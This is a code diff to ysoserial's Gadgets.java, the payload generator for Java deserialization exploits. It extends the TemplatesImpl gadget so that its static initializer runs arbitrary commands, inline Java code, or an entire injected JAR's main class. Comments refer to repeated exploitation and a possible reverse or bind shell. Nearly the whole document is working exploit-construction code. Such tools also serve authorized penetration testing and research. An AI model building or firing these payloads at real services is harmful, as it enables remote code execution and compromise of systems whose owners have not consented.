@@ -3,16 +3,19 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.InputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
-import java.util.HashMap;
-import java.util.Map;
+import java.util.*;
+import java.util.jar.JarEntry;
+import java.util.jar.JarFile;
 
-import com.nqzero.permit.Permit;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -24,6 +27,9 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.xalan.xsltc.trax.TrAXFilter;
+import ysoserial.Strings;
 
 
 /*
@@ -62,6 +68,10 @@ public class Gadgets {
         private static final long serialVersionUID = 8207363842866235160L;
     }
 
+    public static String generateRandomClassName() {
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        return "ysoserial.Pwner" + System.nanoTime();
+    }
 
     public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
@@ -90,21 +100,89 @@ public class Gadgets {
     }
 
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
+    public static Object createTemplatesImpl ( final String[] command ) throws Exception {
+        // run command in static initializer
+        String args = "new String[]{"
+            + Strings.join(Arrays.asList(Strings.escapeJavaStrings(command)), ", ", "\"", "\"")
+            + '}';
+        return createTemplatesImplFromInline("java.lang.Runtime.getRuntime().exec("+ args +");");
+    }
+
+
+    public static Object createTemplatesImpl( final String command ) throws Exception {
+        // run command in static initializer (old behavior)
+        String arg = "\"" + Strings.escapeJavaString(command) + "\"";
+        return createTemplatesImplFromInline("java.lang.Runtime.getRuntime().exec("+ arg +");");
+    }
+
+
+    public static Object createTemplatesImplFromInline( final String inlineCode ) throws Exception {
+        return createTemplatesImpl(inlineCode, new byte[][]{});
+    }
+
+
+    public static Object createClassTemplatesImplFromJar( final String jarFilePath, final String[] mainArgs ) throws Exception {
+        JarFile jarFile = new JarFile(new File(jarFilePath), false);
+        String mainClass = jarFile.getManifest().getMainAttributes().getValue("Main-Class");
+        if(mainClass == null)
+            throw new IllegalArgumentException("No Main-Class manifest value found.");
+        return createClassTemplatesImplFromJar(jarFilePath, mainArgs, mainClass);
+    }
+
+
+    public static Object createClassTemplatesImplFromJar( final String jarFilePath, final String[] mainArgs, String mainClass ) throws Exception {
+        JarFile jarFile = new JarFile(new File(jarFilePath), false);
+        mainClass = Strings.escapeJavaString(mainClass);
+
+        String args = "";
+        if(mainArgs.length == 0) {
+            args = "new String[0]";
+        } else {
+            args = "new String[]{"
+                + Strings.join(Arrays.asList(Strings.escapeJavaStrings(mainArgs)), ", ", "\"", "\"")
+                + '}';
+        }
+
+        // run main method of main-class in static initializer
+        String initializer = "java.lang.Class.forName(\""+mainClass+"\")" +
+            ".getMethod(\"main\", new Class[]{String[].class})" +
+            ".invoke(null, new Object[]{"+ args + "});";
+        List<byte[]> bytecodesList = new ArrayList<byte[]>();
+        byte[] buf = new byte[4096];
+        for (Enumeration<JarEntry> en = jarFile.entries(); en.hasMoreElements(); ) {
+            JarEntry entry = en.nextElement();
+            if(!entry.getName().endsWith(".class")) continue;
+
+            InputStream is = jarFile.getInputStream(entry);
+
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            int bRead;
+            while ((bRead = is.read(buf)) >= 0) {
+                bos.write(buf, 0, bRead);
+            }
+            bytecodesList.add(bos.toByteArray());
+        }
+
+        return createTemplatesImpl(initializer, bytecodesList.toArray(new byte[][]{}));
+    }
+
+    public static Object createTemplatesImpl ( final String inlineCode , final byte[][] extraClasses ) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
             return createTemplatesImpl(
-                command,
+                inlineCode,
+                extraClasses,
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                 Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                 Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
         }
 
-        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createTemplatesImpl(inlineCode, extraClasses, TemplatesImpl.class,
+            AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
-            throws Exception {
+    public static <T> T createTemplatesImpl ( final String inlineCode, byte[][] extraClasses, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+        throws Exception {
         final T templates = tplClass.newInstance();
 
         // use template gadget class
@@ -112,23 +190,23 @@ public class Gadgets {
         pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
         pool.insertClassPath(new ClassClassPath(abstTranslet));
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
+        // set custom Java code block in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replace("\\", "\\\\").replace("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
+        clazz.makeClassInitializer().insertAfter(inlineCode);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+        clazz.setName(generateRandomClassName());
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
 
-        final byte[] classBytes = clazz.toBytecode();
+        clazz.getConstructors()[0].setBody("this.namesArray = new String[0];");
+
+        final byte[][] bytecodes = new byte[extraClasses.length + 2][];
+        System.arraycopy(extraClasses, 0, bytecodes, 0, extraClasses.length);
+        bytecodes[bytecodes.length - 2] = clazz.toBytecode();
+        bytecodes[bytecodes.length - 1] = ClassFiles.classAsBytes(Gadgets.Foo.class);
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
-            classBytes, ClassFiles.classAsBytes(Foo.class)
-        });
+        Reflections.setFieldValue(templates, "_bytecodes", bytecodes);
 
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "Pwnr");
